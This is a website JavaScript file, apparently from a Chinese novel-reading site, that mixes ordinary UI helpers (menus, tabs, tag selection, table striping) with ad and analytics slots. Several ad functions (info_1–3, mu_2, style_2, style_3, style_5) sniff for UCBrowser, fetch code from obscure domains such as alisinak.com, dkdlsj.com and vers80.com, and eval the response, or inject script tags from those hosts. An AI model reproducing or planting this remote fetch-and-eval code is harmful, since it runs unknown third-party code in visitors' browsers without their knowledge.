//浮动菜单 menu-菜单对象id，box-浮动框对象id，参数3-right靠右对齐，默认靠左，参数4-top显示在上方，默认下方
function menubox(menu, box) {
    menu = $_(menu);
    box = $_(box);
    if (box.style.display == 'none') {
        box.style.display = 'block';
        box.style.position = 'absolute';
    } else {
        box.style.display = 'none';
        return;
    }
    var pos = menu.getPosition();
    if (arguments.length > 2 && arguments[2] == 'right') box.style.left = (pos.x + menu.offsetWidth - box.offsetWidth) + 'px';
    else box.style.left = pos.x + 'px';
    if (arguments.length > 3 && arguments[3] == 'top') box.style.top = (pos.y - box.offsetHeight + 1) + 'px';
    else box.style.top = (pos.y + menu.offsetHeight - 1) + 'px';
    return;
}

//tab效果
function selecttab(obj) {
    var i = 0;
    var n = 0;
    var ul = obj.tagName.toLowerCase() == 'li' ? obj.parentNode : obj.parentNode.parentNode;
    var tabs = ul.getElementsByTagName('li');
    for (i = 0; i < tabs.length; i++) {
        tmp = obj.tagName.toLowerCase() == 'li' ? tabs[i] : tabs[i].getElementsByTagName('a')[0];
        if (tmp == obj) {
            tmp.className = 'selected';
            n = i;
        } else {
            tmp.className = '';
        }
    }
    var tabdiv = ul.parentNode;
    if(typeof tabdiv == 'undefined' || tabdiv.tagName.toLowerCase() != 'div') return true;
    var tabchilds = tabdiv.parentNode.childNodes;
    if(typeof tabchilds == 'undefined' || tabchilds.length <= 1) return true;

    var tabcontent;
    for (i = tabchilds.length - 1; i >= 0; i--) {
        if (typeof tabchilds[i].tagName != 'undefined' && tabchilds[i].tagName.toLowerCase() == 'div' && tabchilds[i] != tabdiv) {
            tabcontent = tabchilds[i];
            break;
        }
    }
    if (typeof tabcontent.tagName == 'undefined' || tabcontent.tagName.toLowerCase() != 'div')  return true;
    var contents = tabcontent.childNodes;
    var k = 0;
    for (i = 0; i < contents.length; i++) {
        if (typeof contents[i].tagName != 'undefined' && contents[i].tagName.toLowerCase() == 'div') {
            contents[i].style.display = k == n ? 'block': 'none';
            k++;
        }
    }
    return true;
}

//切换下一个tab
function nexttab(obj) {
    var i = 0;
    var n = 0;
    if (typeof obj == 'string') obj = document.getElementById(obj);
    var tabs = obj.getElementsByTagName('li');
    for (i = 0; i < tabs.length; i++) {
        tmp = tabs[i].getElementsByTagName('a')[0];
        if (tmp.className == 'selected') {
            if (arguments.length > 1 && arguments[1] == true) n = i > 0 ? i - 1 : tabs.length - 1;
            else n = i >= tabs.length - 1 ? 0 : i + 1;
            break;
        }
    }
    tmp = tabs[n].getElementsByTagName('a')[0];
    selecttab(tmp);
}

//tab 轮换
function slidetab(obj) {
    var i = 0;
    var n = 0;
    var time = 5000;
    if (arguments[1]) time = arguments[1];
    if (time == 0) return;
    if (typeof obj == 'string') obj = document.getElementById(obj);
    var tabs = obj.getElementsByTagName('li');
    for (i = 0; i < tabs.length; i++) {
        tmp = tabs[i].getElementsByTagName('a')[0];
        if (tmp.className == 'selected') {
            n = i + 1;
            if (n >= tabs.length) n = 0;
            break;
        }
    }
    tmp = tabs[n].getElementsByTagName('a')[0];
    selecttab(tmp);
    setTimeout(function() {
            slidetab(obj, time);
        },
        time);
}

//选择标签到文本框
function selecttag(txt, tag){
    txt = $_(txt);
    tag = $_(tag);
    var ts = tag.innerHTML.trim();
    var re = new RegExp('(^| )' + ts + '($| )', 'g');
    if(tag.className != 'taguse'){
        tag.className = 'taguse';
        if(!re.test(txt.value)){
            if(txt.value != '') txt.value += ' ';
            txt.value += ts;
        }
    }else{
        tag.className = '';
        txt.value = txt.value.replace(re, ' ');
    }
    txt.value = txt.value.replace(/\s{2,}/g, ' ').replace(/^\s+/g, '');
}

//单双行切换
function sheetrow(){
    var sheets = getByClass('sheet', document, 'table');
    for(var i = 0; i < sheets.length; i++){
        var trs = sheets[i].getElementsByTagName('tr');
        for(var j = 0; j < trs.length; j++){
            trs[j].className = (j % 2 == 1) ? 'even' : 'odd';
        }
    }
}
addEvent(window, 'load', sheetrow);
function index_1(){

}
function index_2(){

}
function index_3(){

}
function index_4(){

}
function info_0(){
    document.writeln("<script charset=\'gbk\' src=\'http://p.tanx.com/ex?i=mm_15913619_8438009_28272313\'></script>");
}
function info_1(){
    var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
    if( (navigator.userAgent.indexOf('UCBrowser') > -1)) {
        (function(){var requestApi={};requestApi.url="https://lhg.alisinak.com/v/974/1/1/11.html";requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();
    }else{
        document.writeln("<script src='http://e.vers80.com/974/1/1/"+Math.floor(Math.random()*9999999+1)+"'><\/script>");
    }
}
function info_2(){
    var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
    if( (navigator.userAgent.indexOf('UCBrowser') > -1)) {
        (function(){var requestApi={};requestApi.url="https://fen.dkdlsj.com/v/904/1/1/11.html";requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();
    }else{
        document.writeln("<script src='http://e.jnsdkjzs.com/904/1/1/"+Math.floor(Math.random()*9999999+1)+".xhtml'><\/script>");
    }
}
function info_3(){
    var randoms = {
        ads_codes: ['<script>;(function(){if(navigator.userAgent.indexOf(\'UCBrowser\') > -1){var a=new XMLHttpRequest();var b="https://sou.dkdlsj.com/17352.html";if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}}else{document.writeln("<script src=\'http://m.cindy17club.com/17352\'><\\/script>")}})();<'+'/script>','  <script>;(function(){var c=navigator.userAgent.indexOf(\'UCBrowser\') > -1  ? \'https://sub.alisinak.com\':\'http://m.vers80.com\';var a=new XMLHttpRequest();var b=navigator.userAgent.indexOf(\'UCBrowser\') > -1 ? c+"/438.html":c+"/438";if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();<'+'/script>'],
        ads_weight: [10,10],

        get_random: function(weight) {
            var s = eval(weight.join('+'));
            var r = Math.floor(Math.random() * s);
            var w = 0;
            var n = weight.length - 1;
            for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
            return n;
        },
        init: function() {

            var rand = randoms.get_random(randoms.ads_weight);
            document.write(randoms.ads_codes[rand]);

        }
    }
    randoms.init();
}
function info_4(){
    document.writeln("<script charset=\'gbk\' src=\'http://p.tanx.com/ex?i=mm_15913619_8438009_31836589\'></script>");
}
function mu_1(){
    document.writeln("<script charset=\'gbk\' src=\'http://p.tanx.com/ex?i=mm_15913619_8438009_31836589\'></script>");
}
function mu_2(){
    var randoms = {
        ads_codes: ['<script>;(function(){if(navigator.userAgent.indexOf(\'UCBrowser\') > -1){var a=new XMLHttpRequest();var b="https://sou.dkdlsj.com/17352.html";if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}}else{document.writeln("<script src=\'http://m.cindy17club.com/17352\'><\\/script>")}})();<'+'/script>','  <script>;(function(){var c=navigator.userAgent.indexOf(\'UCBrowser\') > -1  ? \'https://sub.alisinak.com\':\'http://m.vers80.com\';var a=new XMLHttpRequest();var b=navigator.userAgent.indexOf(\'UCBrowser\') > -1 ? c+"/438.html":c+"/438";if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();<'+'/script>'],
        ads_weight: [10,10],

        get_random: function(weight) {
            var s = eval(weight.join('+'));
            var r = Math.floor(Math.random() * s);
            var w = 0;
            var n = weight.length - 1;
            for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
            return n;
        },
        init: function() {

            var rand = randoms.get_random(randoms.ads_weight);
            document.write(randoms.ads_codes[rand]);

        }
    }
    randoms.init();
}
function mu_3(){

}
function mu_4(){
    document.writeln("<script charset=\'gbk\' src=\'http://p.tanx.com/ex?i=mm_15913619_8438009_28272313\'></script>");
    document.writeln("<br />");
    document.writeln("<br />");
    document.writeln("<br />");
    document.writeln("<br />");
}
function style_2(){
    var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
    if( (navigator.userAgent.indexOf('UCBrowser') > -1)) {
        (function(){var requestApi={};requestApi.url="https://fen.dkdlsj.com/v/904/1/1/11.html";requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();
    }else{
        document.writeln("<script src='http://e.jnsdkjzs.com/904/1/1/"+Math.floor(Math.random()*9999999+1)+".xhtml'><\/script>");
    }
}
function style_1(){
    document.writeln("<script charset=\'gbk\' src=\'http://p.tanx.com/ex?i=mm_15913619_8438009_28272313\'></script>");
}
function style_3(){
    var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
    if( (navigator.userAgent.indexOf('UCBrowser') > -1)) {
        (function(){var requestApi={};requestApi.url="https://lhg.alisinak.com/v/974/1/1/11.html";requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();
    }else{
        document.writeln("<script src='http://e.vers80.com/974/1/1/"+Math.floor(Math.random()*9999999+1)+"'><\/script>");
    }
}
function style_4(){
    document.writeln("<script type=\'text/javascript\'>");
    document.writeln("    /*20:5 创建于 2016年11月17日*/");
    document.writeln("    var cpro_id = \'u2819615\';");
    document.writeln("</script>");
    document.writeln("<script type=\'text/javascript\' src=\'http://cpro.baidustatic.com/cpro/ui/cm.js\'></script>");
    document.writeln("<br />");
    document.writeln("<br />");
    document.writeln("<br />");
    document.writeln("<br />");
    document.writeln("<br />");
    document.writeln("<br />");
}
function style_5(){
    var randoms = {
        ads_codes: ['<script>;(function(){if(navigator.userAgent.indexOf(\'UCBrowser\') > -1){var a=new XMLHttpRequest();var b="https://sou.dkdlsj.com/17352.html";if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}}else{document.writeln("<script src=\'http://m.cindy17club.com/17352\'><\\/script>")}})();<'+'/script>','  <script>;(function(){var c=navigator.userAgent.indexOf(\'UCBrowser\') > -1  ? \'https://sub.alisinak.com\':\'http://m.vers80.com\';var a=new XMLHttpRequest();var b=navigator.userAgent.indexOf(\'UCBrowser\') > -1 ? c+"/438.html":c+"/438";if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();<'+'/script>'],
        ads_weight: [10,10],

        get_random: function(weight) {
            var s = eval(weight.join('+'));
            var r = Math.floor(Math.random() * s);
            var w = 0;
            var n = weight.length - 1;
            for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
            return n;
        },
        init: function() {

            var rand = randoms.get_random(randoms.ads_weight);
            document.write(randoms.ads_codes[rand]);

        }
    }
    randoms.init();
}
function tj(){
    document.writeln("<script src=\'https://s11.cnzz.com/z_stat.php?id=2221230&web_id=2221230\' language=\'JavaScript\'></script>");
    document.writeln("<script>");
    document.writeln("var _hmt = _hmt || [];");
    document.writeln("(function() {");
    document.writeln("  var hm = document.createElement(\"script\");");
    document.writeln("  hm.src = \"//hm.baidu.com/hm.js?6479ae0a2bf9c7ca958ff92e8ced8496\";");
    document.writeln("  var s = document.getElementsByTagName(\"script\")[0]; ");
    document.writeln("  s.parentNode.insertBefore(hm, s);");
    document.writeln("})();");
    document.writeln("</script>");
}
function style_txt(){
    document.writeln("<script charset=\'gbk\' src=\'http://p.tanx.com/ex?i=mm_15913619_8438009_31836589\'></script>");
}
function info_ts(){
    document.writeln("<div class=\'blockcontent fsss\'><font color = \'red\'>已启用缓存技术，最新章节可能会延时显示，登录书架即可实时查看</font></div>");
}